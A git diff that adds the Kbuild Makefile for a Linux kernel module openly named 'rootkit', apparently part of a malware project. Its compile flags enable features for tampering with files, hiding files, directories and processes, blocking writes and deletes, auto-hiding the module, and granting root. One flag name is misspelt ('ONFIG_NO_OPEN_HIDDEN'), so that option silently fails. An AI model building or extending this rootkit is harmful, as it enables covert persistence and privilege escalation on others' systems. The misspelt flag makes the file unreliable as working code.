@@ -1,0 +1,37 @@
+MODNAME		                        ?= rootkit
+CONFIG_FILE                         := $(src)/../../.config
+
+include $(CONFIG_FILE)
+
+#ccflags-y	                        += -I$(src)/header_files  -Wno-error
+
+ccflags-y	                        += -I$(src)/header_files  -w 			# disable warning printed
+
+obj-m		                        += $(MODNAME).o
+$(MODNAME)-y	                    += rk.o
+
+ccflags-$(CONFIG_FILE_TAMPERING)    += -DCONFIG_FILE_TAMPERING
+ccflags-$(CONFIG_FILE_TAMPERING)    += -DTAG_NAME=\"$(CONFIG_TAG_NAME)\"
+
+ccflags-$(CONFIG_HIDE_DIR_AND_FILES)          += -DCONFIG_HIDE_DIR_AND_FILES
+ccflags-$(CONFIG_HIDE_DIR_AND_FILES)          += -DHIDE=\"$(CONFIG_HIDE)\"
+
+ccflags-$(CONFIG_NO_OPEN_HIDDEN)    += -DONFIG_NO_OPEN_HIDDEN
+ccflags-$(CONFIG_NO_WRITE)          += -DCONFIG_NO_WRITE
+ccflags-$(CONFIG_NO_WRITE)          += -DCONFIG_RK_NO_WRITE_FILE_PREFIX
+
+
+ccflags-$(CONFIG_NO_DELETE)          += -DCONFIG_NO_DELETE
+ccflags-$(CONFIG_NO_DELETE)          += -DCONFIG_RK_NO_DELETE_FILE_PREFIX_STRING
+
+
+ccflags-$(CONFIG_HIDE_PROCESS)      += -DCONFIG_HIDE_PROCESS
+ccflags-$(CONFIG_AUTO_HIDE)         += -DCONFIG_AUTO_HIDE
+ccflags-$(CONFIG_GIVE_ROOT)         += -DCONFIG_GIVE_ROOT
+
+
+ccflags-y                           += -DWRITE_ZERO=$(WRITE_ZERO)
+ccflags-y                           += -DZERO_WRITE=$(ZERO_WRITE)
+
+#KBUILD_CFLAGS	                    := $(filter-out -pg,$(KBUILD_CFLAGS))
+#KBUILD_CFLAGS	                    := $(filter-out -mfentry,$(KBUILD_CFLAGS))
